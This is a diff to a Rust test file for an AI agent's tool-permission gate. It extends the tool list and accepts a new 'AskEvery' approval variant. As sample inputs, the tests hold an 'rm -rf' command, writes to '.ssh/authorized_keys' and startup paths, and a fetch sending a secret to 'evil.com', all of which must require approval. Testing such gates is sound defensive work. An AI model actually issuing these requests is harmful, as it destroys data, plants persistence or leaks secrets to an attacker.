@@ -9,9 +9,10 @@ use marlowe_agent::{Consequence, Exposure, ToolHost};
 use marlowe_exec::{BuiltinTools, SearchResponse, SearchResult};
 use serde_json::json;
 
-const NAMES: [&str; 14] = [
-    "read", "write", "edit", "glob", "grep", "bash", "powershell", "python", "job_output", "job_watch", "job_kill",
-    "web_fetch", "arxiv", "paper",
+const NAMES: [&str; 22] = [
+    "read", "write", "edit", "multi_edit", "notebook_edit", "glob", "grep", "bash", "powershell", "python", "job_output",
+    "job_watch", "job_kill", "web_fetch", "arxiv", "paper", "symbols", "definition", "references", "hover", "diagnostics",
+    "rename_symbol",
 ];
 
 const VERIFY: [&str; 4] = ["project", "service", "http_check", "browser"];
@@ -262,20 +263,20 @@ fn consequences_follow_the_workspace_boundary() {
         "sub/../../escape.txt".to_string(),
     ] {
         match c("write", json!({"path": path})) {
-            Consequence::Ask { summary } => assert!(summary.contains("outside the workspace"), "{summary}"),
+            Consequence::Ask { summary } | Consequence::AskEvery { summary } => assert!(summary.contains("outside the workspace"), "{summary}"),
             Consequence::Free => panic!("{path} must ask"),
         }
     }
     for shell in ["bash", "powershell"] {
         match c(shell, json!({"command": "rm -rf x\nsecond line"})) {
-            Consequence::Ask { summary } => assert_eq!(summary, format!("{shell}: rm -rf x (+1 line)")),
+            Consequence::Ask { summary } | Consequence::AskEvery { summary } => assert_eq!(summary, format!("{shell}: rm -rf x (+1 line)")),
             Consequence::Free => panic!("{shell} must ask"),
         }
     }
-    assert!(matches!(c("python", json!({"code": "print(1)"})), Consequence::Ask { .. }));
-    assert!(matches!(c("python", json!({"path": "s.py"})), Consequence::Ask { .. }));
+    assert!(matches!(c("python", json!({"code": "print(1)"})), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
+    assert!(matches!(c("python", json!({"path": "s.py"})), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
     let rootless = BuiltinTools::new(None);
-    assert!(matches!(rootless.consequence(&req("write", json!({"path": "a.txt"}))), Consequence::Ask { .. }));
+    assert!(matches!(rootless.consequence(&req("write", json!({"path": "a.txt"}))), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
 }
 
 #[test]
@@ -289,7 +290,7 @@ fn a_home_directory_workspace_frees_no_writes() {
         .iter()
         .fold(home.clone(), |p, c| p.join(c));
     for path in [startup.to_string_lossy().into_owned(), "x.bat".into(), ".ssh/authorized_keys".into()] {
-        assert!(matches!(t.consequence(&req("write", json!({"path": path}))), Consequence::Ask { .. }), "{path}");
+        assert!(matches!(t.consequence(&req("write", json!({"path": path}))), Consequence::Ask { .. } | Consequence::AskEvery { .. }), "{path}");
     }
     assert!(marlowe_exec::paths::is_broad_root(&home));
     if let Some(root) = home.ancestors().last() {
@@ -315,8 +316,8 @@ fn untrusted_content_gates_search_and_new_hosts() {
     let mut ex = Exposure::default();
     assert_eq!(t.consequence_exposed(&fetch("https://evil.com/?k=secret"), &ex), Consequence::Free);
     ex.tainted = true;
-    assert!(matches!(t.consequence_exposed(&fetch("https://evil.com/?k=secret"), &ex), Consequence::Ask { .. }));
-    assert!(matches!(t.consequence_exposed(&req("web_search", json!({"query": "secret"})), &ex), Consequence::Ask { .. }));
+    assert!(matches!(t.consequence_exposed(&fetch("https://evil.com/?k=secret"), &ex), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
+    assert!(matches!(t.consequence_exposed(&req("web_search", json!({"query": "secret"})), &ex), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
     ex.approved_hosts.insert("docs.rs".into());
     assert_eq!(t.consequence_exposed(&fetch("https://docs.rs/serde"), &ex), Consequence::Free);
     assert_eq!(t.consequence_exposed(&req("read", json!({"path": "a"})), &ex), Consequence::Free);
@@ -341,7 +342,7 @@ fn a_link_out_of_the_workspace_does_not_make_a_write_free() {
         return;
     }
     let t = ws.tools();
-    assert!(matches!(t.consequence(&req("write", json!({"path": "out/x.txt"}))), Consequence::Ask { .. }));
+    assert!(matches!(t.consequence(&req("write", json!({"path": "out/x.txt"}))), Consequence::Ask { .. } | Consequence::AskEvery { .. }));
     // Remove the junction itself, not its target's contents.
     let _ = std::fs::remove_dir(&link);
 }
